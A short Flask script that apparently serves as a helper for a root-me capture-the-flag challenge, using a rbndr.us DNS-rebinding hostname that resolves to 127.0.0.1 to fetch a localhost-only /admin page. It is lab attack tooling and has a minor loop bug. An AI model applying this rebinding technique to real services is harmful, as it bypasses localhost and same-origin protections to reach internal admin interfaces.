from flask import Flask, send_from_directory, current_app
import requests
import json
import time
app = Flask(__name__, static_url_path='/templates')

@app.route('/')
def hello_world():
    return send_from_directory('static', 'api1.html')


@app.route('/admin')
def send_js():
    return current_app.send_static_file('static/api1.html')


@app.route('/admin2')
def meteo():
    i=0
    while i<10:
        #response = requests.get("https://lock.cmpxchg8b.com/rebinder.html")
        response = requests.get('http://7f000001.5902b8bc.rbndr.us:54022/admin')
        #response = requests.get('http://challenge01.root-me.org:54022/admin')
        #content = response.text
        time.sleep(2)
        i=i+1
        return response.text
        #content = json.loads(response.content.decode('utf-8'))



if __name__ == '__main__':
    app.run(host='0.0.0.0',port=9002)